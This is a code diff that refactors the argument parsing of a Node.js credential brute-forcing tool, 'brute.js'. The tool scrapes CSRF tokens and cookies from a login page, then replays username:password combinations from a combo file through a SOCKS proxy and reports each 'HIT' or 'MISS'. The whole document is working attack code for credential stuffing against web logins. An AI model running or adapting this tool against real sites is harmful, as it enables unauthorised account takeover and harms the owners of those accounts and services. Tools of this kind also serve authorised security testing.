@@ -12,21 +12,42 @@
  * @licence MIT
  */
 
-var request = require('request');
-var RateLimiter = require('limiter').RateLimiter;
-var argv = require('minimist')(process.argv.slice(2));
-//use https client if url is https
-var Agent = argv.u.indexOf("https") == -1 ? require('socks5-http-client/lib/Agent') : require('socks5-https-client/lib/Agent');
-var j = request.jar();
-var request = request.defaults({jar: j});
-var cheerio = require('cheerio'); //lightweight jQuery
-Promise = require('bluebird'); //until ECMAScript 7 await async...
+const Request = require('request');
+const jar = Request.jar();
+const request = Request.defaults({jar: jar});
+const RateLimiter = require('limiter').RateLimiter;
+const cheerio = require('cheerio'); //lightweight jQuery
+const Promise = require('bluebird'); //until ECMAScript 7 await async...
+const meow = require('meow');
 
+const cli = meow(`
+        Usage
+          $ brute.js
+        Options
+          -u, --url             url of page to get CFLR token and cookie
+          -l, --login           url of login page (defaults to CFLR page)
+          -c, --login-file      file containing username:password combinations
+          -p, --data            post data. Replace password field with \`PASS\`, username field with \`USER\`, and CFLR token with a jquery select
+          -r, --retries         max number of tries per minute
+          -f, --failed-message  the substring that signifies a failed login
+`, {
+    string: 'url',
+    string: 'login',
+    string: 'login-file',
+    string: 'data',
+    string: 'retries',
+    string: 'failed-message',
+    alias: { u: 'url', l: 'login', c: 'login-file', p: 'data', r: 'retries', f: 'failed-message' },
+    default: { retries: 10 }
+});
+
+//use https client if url is https
+const Agent = cli.flags.url.indexOf("https") == -1 ? require('socks5-http-client/lib/Agent') : require('socks5-https-client/lib/Agent');
 var socksProxy = true;
 var httpProxy = false;
-var userPassFile = argv.c; //'comboExamples.txt';
+var userPassFile = cli.flags.c; //'comboExamples.txt';
 //limit rate the prevent overloading network
-var limiter = new RateLimiter(argv.r | 10, 'minute');
+var limiter = new RateLimiter(cli.flags.retries, 'minute');
 //require('request').debug = true;
 
 /**
@@ -34,7 +55,7 @@ var limiter = new RateLimiter(argv.r | 10, 'minute');
  * @return token is the first hidden value
  */
 var options = {
-    url: argv.u,
+    url: cli.flags.url,
     headers: {
         Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         //for now only accept text
@@ -58,7 +79,7 @@ if (socksProxy) {
     options.proxy = 'http://127.0.0.1:8080';
 }
 
-postParams = argv.p; //'formunqid=`input[type=hidden]`&userid=`USER`&password=`PASS`&submit=Login';
+postParams = cli.flags.data; //'formunqid=`input[type=hidden]`&userid=`USER`&password=`PASS`&submit=Login';
 //extract token jqueries
 //if there no tokens, then directly brute
 tokenSelectors = postParams.split('`').filter((value) => {
@@ -93,13 +114,13 @@ function getSelections(html, select) {
 function brute(options, tokenSelectors, postParam, user, pass) {
     function getToken() {
         //make request to url without params TODO:allow user control
-        options.url = argv.l || argv.u;
+        options.url = cli.flags.login || cli.flags.url;
         return new Promise(
             function (resolve, reject) {
                 request(options, function (err, res) {
                     if (err) console.error(err);
                     //reset the url
-                    options.url = argv.u;
+                    options.url = cli.flags.url;
                     var token = getSelections(res.body, tokenSelectors);
                     resolve({'token': token, 'cookie': res.headers['set-cookie']});
                 });
@@ -134,7 +155,7 @@ function brute(options, tokenSelectors, postParam, user, pass) {
         var bruteAttempt = yield attemptBrute(tokens.token, tokens.cookie);
         console.log(bruteAttempt);
         //if attempt was a fail
-        if (bruteAttempt.indexOf(argv.f) != -1)
+        if (bruteAttempt.indexOf(cli.flags.f) != -1)
             console.log("MISS! " + user + ":" + pass);
         else //success
             console.log("HIT! " + user + ":" + pass);
